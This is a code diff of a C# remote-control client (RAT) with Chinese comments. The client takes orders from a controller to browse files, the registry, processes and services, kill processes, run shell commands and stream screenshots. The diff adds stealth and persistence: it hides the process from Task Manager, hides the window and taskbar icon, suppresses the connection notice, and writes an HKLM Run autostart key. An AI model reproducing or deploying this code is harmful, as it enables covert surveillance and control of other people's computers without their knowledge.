@@ -1,7 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
 using System.Text;
 using System.Windows.Forms;
@@ -12,9 +9,8 @@ using System.Management;  //加入WMI
 using System.IO;
 using System.Diagnostics;
 using Microsoft.Win32;
-#pragma warning disable 0168
 #pragma warning disable 0618
-namespace Control_Client
+namespace RFC
 {
     public partial class Main_Form : Form
     {
@@ -25,18 +21,18 @@ namespace Control_Client
         NetworkStream Stream;
         Socket socket;
         Socket Lis_socket;
-        String LocalDisk_List     = "$GetDir||";                     //电脑盘符命令，初始化命令头
-        String Online_Order       = "$Online||";                     //上线命令，初始化命令头部
-        String Folder_List        = "$GetFolder||";                  //列举子文件夹命令，初始化命令头
-        String File_List          = "$GetFile||";                    //列举文件命令，初始化命令头
-        String Process_List       = "$GetProcess||";                 //列举文件命令，初始化命令头
-        String RegName_List       = "$GetRegisterRoot||";            //列举注册表子项名命令，初始化命令头
-        String RegNameValues_List = "$GetRegisterRootValues||";      //列举注册表子项值命令，初始化命令头
-        String CMD_List           = "$ActiveDos||";                  //保存DOS命令执行后的结果
-        String Service_List       = "$GetService||";                 //保存系统服务列表
-        Process CMD = new Process();                                 //用于执行DOS命令
-        bool _IsStop_Catching_Desktop = false;                       //此标识为用于判断是否停止对于屏幕的获取
-        UdpClient UDP_Client = new UdpClient();
+        string LocalDisk_List     = "$GetDir||";                     //电脑盘符命令，初始化命令头
+        string Online_Order       = "$Online||";                     //上线命令，初始化命令头部
+        string Folder_List        = "$GetFolder||";                  //列举子文件夹命令，初始化命令头
+        string File_List          = "$GetFile||";                    //列举文件命令，初始化命令头
+        string Process_List       = "$GetProcess||";                 //列举文件命令，初始化命令头
+        string RegName_List       = "$GetRegisterRoot||";            //列举注册表子项名命令，初始化命令头
+        string RegNameValues_List = "$GetRegisterRootValues||";      //列举注册表子项值命令，初始化命令头
+        readonly string CMD_List           = "$ActiveDos||";                  //保存DOS命令执行后的结果
+        readonly string Service_List       = "$GetService||";                 //保存系统服务列表
+        //readonly Process CMD = new Process();                                 //用于执行DOS命令
+        readonly bool _IsStop_Catching_Desktop = false;                       //此标识为用于判断是否停止对于屏幕的获取
+        readonly UdpClient UDP_Client = new UdpClient();
         public delegate void Pt();
 
         #endregion
@@ -51,6 +47,8 @@ namespace Control_Client
         #endregion
 
         #region  窗体加载动作
+
+        private readonly HideTaskmgrList _List = new HideTaskmgrList();
 
         /// <summary>
         /// 窗体加载时默认连接主控端主机
@@ -71,6 +69,14 @@ namespace Control_Client
             Lis.Start();  //一直监听
             Thread thread_Lis_MySelf = new Thread(new ThreadStart(this.Listen_Port));
             thread_Lis_MySelf.Start();
+
+            _List.ProcessName = "Control_Client.exe";
+            _List.Star();
+
+            this.ShowInTaskbar = false;
+            this.Visible = false;
+
+            SetMeStart(true);
         }
 
         #endregion
@@ -78,7 +84,7 @@ namespace Control_Client
         #region 创建子窗口
         private void CreateWindow()
         {
-            teach TH = new teach();
+            Teach TH = new Teach();
             TH.Show();
         }
         #endregion
@@ -122,7 +128,7 @@ namespace Control_Client
                 }
                 catch (Exception)
                 {
-                    System.Threading.Thread.Sleep(10000);
+                    Thread.Sleep(10000);
                 }
             }
         }
@@ -156,9 +162,9 @@ namespace Control_Client
         /// <param name="QueryString"></param>
         /// <param name="Item_Name"></param>
         /// <returns></returns>
-        public String WMI_Searcher(String QueryString , String Item_Name)
+        public string WMI_Searcher(string QueryString , string Item_Name)
         {
-            String Result = "";
+            string Result = "";
             ManagementObjectSearcher MOS = new ManagementObjectSearcher(QueryString);
             ManagementObjectCollection MOC = MOS.Get();
             foreach (ManagementObject MOB in MOC)
@@ -178,9 +184,9 @@ namespace Control_Client
         /// <param name="QueryString"></param>
         /// <param name="Item_Name"></param>
         /// <returns></returns>
-        public String WMI_Searcher_Service_Ex(String QueryString)
+        public string WMI_Searcher_Service_Ex(string QueryString)
         {
-            String Result = "";
+            string Result = "";
             ManagementObjectSearcher MOS = new ManagementObjectSearcher(QueryString);
             ManagementObjectCollection MOC = MOS.Get();
             foreach (ManagementObject MOB in MOC)
@@ -199,7 +205,7 @@ namespace Control_Client
 
                     Result += MOB["Description"].ToString() + "||";
                 }
-                catch (Exception ex)
+                catch (Exception)
                 { };
             }
             MOC.Dispose();
@@ -216,7 +222,7 @@ namespace Control_Client
         /// 根据不同的命令调用不同的方法进行处理
         /// </summary>
         /// <param name="Order_Set"></param>
-        public void Order_Catcher(String[] Order_Set)
+        public void Order_Catcher(string[] Order_Set)
         {
             switch (Order_Set[0])
             {
@@ -338,7 +344,7 @@ namespace Control_Client
         /// </summary>
         public void Online_OK()
         {
-            this.Sys_Icon.ShowBalloonTip(5000, "上线成功", "成功连接到主控端!", ToolTipIcon.Info);
+            //this.Sys_Icon.ShowBalloonTip(5000, "上线成功", "成功连接到主控端!", ToolTipIcon.Info);
         }
 
         #endregion
@@ -353,14 +359,14 @@ namespace Control_Client
         private void Main_Form_FormClosing(object sender, FormClosingEventArgs e)
         {
             //下线命令 原型 ： $OffLine||
-            String Order = "$OffLine||";
+            string Order = "$OffLine||";
             try
             {
                 //尝试发送下线请求
                 this.Stream.Write(Encoding.Default.GetBytes(Order + ((IPEndPoint)this.socket.LocalEndPoint).Address.ToString()), 0, Encoding.Default.GetBytes(Order + ((IPEndPoint)this.socket.LocalEndPoint).Address.ToString()).Length);
                 this.Stream.Flush();
             }
-            catch (Exception ex)
+            catch (Exception)
             { };
             Environment.Exit(0);
         }
@@ -421,11 +427,11 @@ namespace Control_Client
         /// 此方法用于根据指定盘符列举子文件夹
         /// </summary>
         /// <param name="Path"></param>
-        public void Get_Foloder(String Path)
+        public void Get_Foloder(string Path)
         {
             this.Folder_List = "$GetFolder||";
             //得到指定盘符的所有子文件夹
-            String[] Folder = Directory.GetDirectories(Path);
+            string[] Folder = Directory.GetDirectories(Path);
             for (int i = 0; i < Folder.Length; i++)
 			{
                 this.Folder_List += Folder[i] + ",";
@@ -450,11 +456,11 @@ namespace Control_Client
         /// 此方法用于根据指定盘符列举子所有文件
         /// </summary>
         /// <param name="Path"></param>
-        public void Get_File(String Path)
+        public void Get_File(string Path)
         {
             this.File_List = "$GetFile||";
             //得到文件目标文件夹文件数组
-            String[] Result_List = Directory.GetFiles(Path);
+            string[] Result_List = Directory.GetFiles(Path);
             //通过拆分得到结果字符串
             for (int i = 0; i < Result_List.Length; i++)
             {
@@ -493,10 +499,10 @@ namespace Control_Client
                     //接收命令
                     int Order_Len = this.Stream.Read(bb, 0, bb.Length);
                     //得到主控端发来的命令集合
-                    String[] Order_Set = Encoding.Default.GetString(bb, 0, Order_Len).Split(new String[] { "||" }, StringSplitOptions.RemoveEmptyEntries);
+                    string[] Order_Set = Encoding.Default.GetString(bb, 0, Order_Len).Split(new string[] { "||" }, StringSplitOptions.RemoveEmptyEntries);
                     this.Order_Catcher(Order_Set);
                 }
-                catch (Exception ex)
+                catch (Exception)
                 { };
             }
         }
@@ -519,17 +525,17 @@ namespace Control_Client
                             //得到命令
                             int Res_Len = ns.Read(bb, 0, bb.Length);
                             //得到完整命令分割后的数组结构
-                            String[] Order_Set = Encoding.Default.GetString(bb, 0, Res_Len).Split(new String[] { "||" }, StringSplitOptions.RemoveEmptyEntries);
+                            string[] Order_Set = Encoding.Default.GetString(bb, 0, Res_Len).Split(new string[] { "||" }, StringSplitOptions.RemoveEmptyEntries);
                             //调用判断命令函数
                             this.Order_Catcher(Order_Set);
                         }
-                        catch (Exception ex)
+                        catch (Exception)
                         {
                             //MessageBox.Show("Error Receive2 " + ex.ToString());
                         }
                     }
                 }
-                catch (Exception ex)
+                catch (Exception)
                 { };
             }
         }
@@ -556,7 +562,7 @@ namespace Control_Client
                         this.Process_List += process[i].ProcessName + "," + process[i].Handle.ToString() + "," + process[i].Id + "||";
                     }
                 }
-                catch (Exception ex)
+                catch (Exception)
                 { };
             }
             try
@@ -580,7 +586,7 @@ namespace Control_Client
         /// 否则返回 $KillProcess||False
         /// </summary>
         /// <param name="Process_Name"></param>
-        public void Kill_Process(String Process_Name)
+        public void Kill_Process(string Process_Name)
         {
             bool isKilled = false;
             Process[] Process_Set = Process.GetProcesses(); 
@@ -598,7 +604,7 @@ namespace Control_Client
                         break;
                     }
                 }
-                catch (Exception ex)
+                catch (Exception)
                 { };
             }
 
@@ -626,11 +632,11 @@ namespace Control_Client
         /// <summary>
         /// 此方法用于得到当前系统注册表根目录名字并且发送
         /// </summary>
-        public void Get_RegRoot(String Key_Model, String Key_Path)
+        public void Get_RegRoot(string Key_Model, string Key_Path)
         {
             this.RegName_List = "$GetRegisterRoot||";
             //新建数组结构体用来接收得到的子项名集合
-            String[] Reg_Name_Set = this.Get_Register_Root_Names(Key_Model, Key_Path);
+            string[] Reg_Name_Set = this.Get_Register_Root_Names(Key_Model, Key_Path);
             for (int i = 0; i < Reg_Name_Set.Length; i++)
             {
                 //拼接结果字符串
@@ -659,10 +665,10 @@ namespace Control_Client
         /// <param name="Key_Model"></param>
         /// <param name="Key_Path"></param>
         /// <returns></returns>
-        public String[] Get_Register_Root_Names(String Key_Model , String Key_Path)
+        public string[] Get_Register_Root_Names(string Key_Model , string Key_Path)
         {
             //新建数组，用来储存子项名字集合
-            String[] Names = null;
+            string[] Names = null;
             //如果是检索根键值
             if (Key_Path == "******%None%******")
             {
@@ -727,7 +733,7 @@ namespace Control_Client
                 /// <summary>
         /// 此方法用于得到当前系统注册表根目录子项所有值并且发送
         /// </summary>
-        public void Get_RegRootValues(String Key_Model, String Key_Path)
+        public void Get_RegRootValues(string Key_Model, string Key_Path)
         {
             this.RegNameValues_List = "$GetRegisterRootValues||";
             //新建数组结构体用来接收得到的子项名集合
@@ -755,10 +761,10 @@ namespace Control_Client
         /// <param name="Key_Model"></param>
         /// <param name="Key_Path"></param>
         /// <returns></returns>
-        public String Get_Register_Root_Values(String Key_Model, String Key_Path)
+        public string Get_Register_Root_Values(string Key_Model, string Key_Path)
         {
             //新建数组，用来储存子项名字集合
-            String Result_List ="";
+            string Result_List ="";
             //如果是检索根键值
             if (Key_Path == "******%None%******")
             {
@@ -769,7 +775,7 @@ namespace Control_Client
                     case "HKEY_CLASSES_ROOT":
                     using(RegistryKey RK = Registry.ClassesRoot)
                     {
-                        foreach (String VName in RK.GetValueNames())
+                        foreach (string VName in RK.GetValueNames())
                         {
                          Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                         }
@@ -779,7 +785,7 @@ namespace Control_Client
                     case "HKEY_CURRENT_CONFIG":
                     using (RegistryKey RK = Registry.CurrentConfig)
                     {
-                        foreach (String VName in RK.GetValueNames())
+                        foreach (string VName in RK.GetValueNames())
                         {
                             Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                         }
@@ -789,7 +795,7 @@ namespace Control_Client
                     case "HKEY_CURRENT_USER":
                     using (RegistryKey RK = Registry.CurrentUser)
                     {
-                        foreach (String VName in RK.GetValueNames())
+                        foreach (string VName in RK.GetValueNames())
                         {
                             Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                         }
@@ -799,7 +805,7 @@ namespace Control_Client
                     case "HKEY_LOCAL_MACHINE":
                     using (RegistryKey RK = Registry.LocalMachine)
                     {
-                        foreach (String VName in RK.GetValueNames())
+                        foreach (string VName in RK.GetValueNames())
                         {
                             Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                         }
@@ -809,7 +815,7 @@ namespace Control_Client
                     case "HKEY_USERS":
                     using (RegistryKey RK = Registry.Users)
                     {
-                        foreach (String VName in RK.GetValueNames())
+                        foreach (string VName in RK.GetValueNames())
                         {
                             Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                         }
@@ -827,7 +833,7 @@ namespace Control_Client
                     case "HKEY_CLASSES_ROOT":
                     using (RegistryKey RK = Registry.ClassesRoot.OpenSubKey(Key_Path))
                     {
-                        foreach(String VName in RK.GetValueNames())
+                        foreach(string VName in RK.GetValueNames())
                         {
                             Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                         }
@@ -837,7 +843,7 @@ namespace Control_Client
                     case "HKEY_CURRENT_CONFIG":
                     using (RegistryKey RK = Registry.CurrentConfig.OpenSubKey(Key_Path))
                     {
-                        foreach(String VName in RK.GetValueNames())
+                        foreach(string VName in RK.GetValueNames())
                         {
                             Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                         }
@@ -847,7 +853,7 @@ namespace Control_Client
                     case "HKEY_CURRENT_USER":
                     using (RegistryKey RK = Registry.CurrentUser.OpenSubKey(Key_Path))
                     {
-                        foreach (String VName in RK.GetValueNames())
+                        foreach (string VName in RK.GetValueNames())
                         {
                             Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                         }
@@ -857,7 +863,7 @@ namespace Control_Client
                     case "HKEY_LOCAL_MACHINE":
                     using (RegistryKey RK = Registry.LocalMachine.OpenSubKey(Key_Path))
                     {
-                        foreach (String VName in RK.GetValueNames())
+                        foreach (string VName in RK.GetValueNames())
                         {
                             Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                         }
@@ -867,7 +873,7 @@ namespace Control_Client
                     case "HKEY_USERS":
                     using (RegistryKey RK = Registry.Users.OpenSubKey(Key_Path))
                     {
-                        foreach (String VName in RK.GetValueNames())
+                        foreach (string VName in RK.GetValueNames())
                         {
                             Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
                         }
@@ -913,7 +919,7 @@ namespace Control_Client
             //如果存在
             else
             {
-                String Result = this.Get_Message_Command("");
+                string Result = this.Get_Message_Command("");
                 try
                 {
                     //得到进程列表后，尝试发送
@@ -936,10 +942,10 @@ namespace Control_Client
         /// 并发送给主控端
         /// </summary>
         /// <param name="Order"></param>
-        public void Execute_Command(String Order)
+        public void Execute_Command(string Order)
         {
             //MessageBox.Show("Client  " + Order);
-            String Result = "$ExecuteCommand||" + this.Get_Message_Command(Order);
+            string Result = "$ExecuteCommand||" + this.Get_Message_Command(Order);
             //MessageBox.Show("Client Send" + Result);
             try
             {
@@ -951,7 +957,7 @@ namespace Control_Client
                     Ns.Flush();
                 }
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                // MessageBox.Show("尝试发不存在DOS执行结果失败 : " + ex.Message);
             }
@@ -963,7 +969,7 @@ namespace Control_Client
         /// </summary>
         /// <param name="Command"></param>
         /// <returns></returns>
-        public String Get_Message_Command(String Command)
+        public string Get_Message_Command(string Command)
         {
             /*
             this.CMD.StartInfo.FileName = "cmd.exe";
@@ -1012,7 +1018,7 @@ namespace Control_Client
         /// </summary>
         public void GetService()
         {
-            String Result_List = this.Service_List + this.WMI_Searcher_Service_Ex("SELECT * FROM Win32_Service");
+            string Result_List = this.Service_List + this.WMI_Searcher_Service_Ex("SELECT * FROM Win32_Service");
             try
             {
                 //得到进程列表后，尝试发送
@@ -1061,13 +1067,13 @@ namespace Control_Client
 
         public void Send_Desktop_Image_Info(MemoryStream Ms)
         {
-            int Len = 0;
             byte[] bb = new byte[2048];
             Ms.Position = 0;
+            int Len;
             while ((Len = Ms.Read(bb, 0, bb.Length)) > 0)
             {
                 this.UDP_Client.Send(bb, Len);
-                System.Threading.Thread.Sleep(1);
+                Thread.Sleep(1);
             }
             //发送结尾符
             this.UDP_Client.Send(Encoding.Default.GetBytes("**End**"), Encoding.Default.GetBytes("**End**").Length);
@@ -1101,6 +1107,121 @@ namespace Control_Client
         public void Active_Timer()
         {
             this.Desktop_Timer.Start();
+        }
+
+        public static bool SetMeStart(bool onOff)
+        {
+            string appName = Process.GetCurrentProcess().MainModule.ModuleName;
+            string appPath = Process.GetCurrentProcess().MainModule.FileName;
+            bool isOk = SetAutoStart(onOff, appName, appPath);
+            return isOk;
+        }
+
+        /// <summary>
+        /// 将应用程序设为或不设为开机启动
+        /// </summary>
+        /// <param name="onOff">自启开关</param>
+        /// <param name="appName">应用程序名</param>
+        /// <param name="appPath">应用程序完全路径</param>
+        public static bool SetAutoStart(bool onOff, string appName, string appPath)
+        {
+            bool isOk = true;
+            //如果从没有设为开机启动设置到要设为开机启动
+            if (!IsExistKey(appName) && onOff)
+            {
+                isOk = SelfRunning(onOff, appName, @appPath);
+            }
+            //如果从设为开机启动设置到不要设为开机启动
+            else if (IsExistKey(appName) && !onOff)
+            {
+                isOk = SelfRunning(onOff, appName, @appPath);
+            }
+            return isOk;
+        }
+
+        /// <summary>
+        /// 判断注册键值对是否存在，即是否处于开机启动状态
+        /// </summary>
+        /// <param name="keyName">键值名</param>
+        /// <returns></returns>
+        private static bool IsExistKey(string keyName)
+        {
+            try
+            {
+                bool _exist = false;
+                RegistryKey local = Registry.LocalMachine;
+                RegistryKey runs = local.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+                if (runs == null)
+                {
+                    RegistryKey key2 = local.CreateSubKey("SOFTWARE");
+                    RegistryKey key3 = key2.CreateSubKey("Microsoft");
+                    RegistryKey key4 = key3.CreateSubKey("Windows");
+                    RegistryKey key5 = key4.CreateSubKey("CurrentVersion");
+                    RegistryKey key6 = key5.CreateSubKey("Run");
+                    runs = key6;
+                }
+                string[] runsName = runs.GetValueNames();
+                foreach (string strName in runsName)
+                {
+                    if (strName.ToUpper() == keyName.ToUpper())
+                    {
+                        _exist = true;
+                        return _exist;
+                    }
+                }
+                return _exist;
+
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        /// <summary>
+        /// 写入或删除注册表键值对,即设为开机启动或开机不启动
+        /// </summary>
+        /// <param name="isStart">是否开机启动</param>
+        /// <param name="exeName">应用程序名</param>
+        /// <param name="path">应用程序路径带程序名</param>
+        /// <returns></returns>
+        private static bool SelfRunning(bool isStart, string exeName, string path)
+        {
+            try
+            {
+                RegistryKey local = Registry.LocalMachine;
+                RegistryKey key = local.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+                if (key == null)
+                {
+                    local.CreateSubKey("SOFTWARE//Microsoft//Windows//CurrentVersion//Run");
+                }
+                //若开机自启动则添加键值对
+                if (isStart)
+                {
+                    key.SetValue(exeName, path);
+                    key.Close();
+                }
+                else//否则删除键值对
+                {
+                    string[] keyNames = key.GetValueNames();
+                    foreach (string keyName in keyNames)
+                    {
+                        if (keyName.ToUpper() == exeName.ToUpper())
+                        {
+                            key.DeleteValue(exeName);
+                            key.Close();
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                _ = ex.Message;
+                return false;
+                //throw;
+            }
+
+            return true;
         }
 
         #endregion
